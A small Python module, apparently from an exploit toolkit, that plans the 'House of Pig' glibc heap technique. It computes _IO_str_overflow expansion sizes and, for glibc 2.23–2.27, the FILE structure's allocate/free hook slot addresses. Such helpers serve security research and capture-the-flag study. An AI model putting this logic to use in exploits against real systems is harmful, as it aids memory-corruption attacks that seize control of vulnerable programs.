"""House of Pig memstream expansion sink plan."""
from dataclasses import dataclass
@dataclass(frozen=True)
class PigPlan:
    old_buffer_addr: int
    old_length: int
    new_size: int
    allocate_slot_addr: int | None
    free_slot_addr: int | None

def build_house_of_pig(*, version: str, old_buffer_addr: int, old_length: int,
                       stream_addr: int | None = None) -> PigPlan:
    """计算 `_IO_str_overflow` 扩容数据流。

    2.23～2.27 返回 FILE 尾部旧式 allocate/free 槽地址；2.28+ 返回直接
    malloc/memcpy/free 的 new_size，旧回调槽不再是消费点。
    """
    if old_length <= 0: raise ValueError('old_length must be positive')
    if version not in {f'2.{i}' for i in range(23, 44)}: raise ValueError('unsupported glibc version')
    new_size = 2 * old_length + 100
    if version <= '2.27' and stream_addr is None: raise ValueError('legacy Pig requires stream_addr')
    slots = (stream_addr + 0xE0, stream_addr + 0xE8) if stream_addr is not None and version <= '2.27' else (None, None)
    return PigPlan(old_buffer_addr, old_length, new_size, *slots)
